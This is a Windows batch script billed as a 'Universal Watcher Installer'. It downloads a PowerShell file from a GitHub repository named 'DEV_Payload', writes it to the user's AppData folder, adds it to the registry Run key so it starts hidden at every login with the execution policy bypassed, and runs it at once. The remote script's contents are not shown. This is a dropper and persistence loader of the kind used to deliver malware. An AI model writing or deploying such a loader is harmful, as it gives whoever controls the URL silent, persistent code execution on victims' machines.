@echo off
:: ===============================================
:: UNIVERSAL WATCHER INSTALLER + AUTORUN REGISTRATION
:: ===============================================

:: Define variables
set "BOOTSTRAP=%APPDATA%\UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1"
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1"

:: Delete any old file first
if exist "%BOOTSTRAP%" (
    del /f /q "%BOOTSTRAP%"
)

:: Download and save fresh file
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Bootstrapper'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "Set-Content -Path '%BOOTSTRAP%' -Value $remote"

:: Create registry autorun key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UniversalWatcherPS1" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%BOOTSTRAP%\"" /f

:: Run it immediately
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"

echo.
echo Script installed successfully.
echo The script will now run automatically each time you log in.
pause
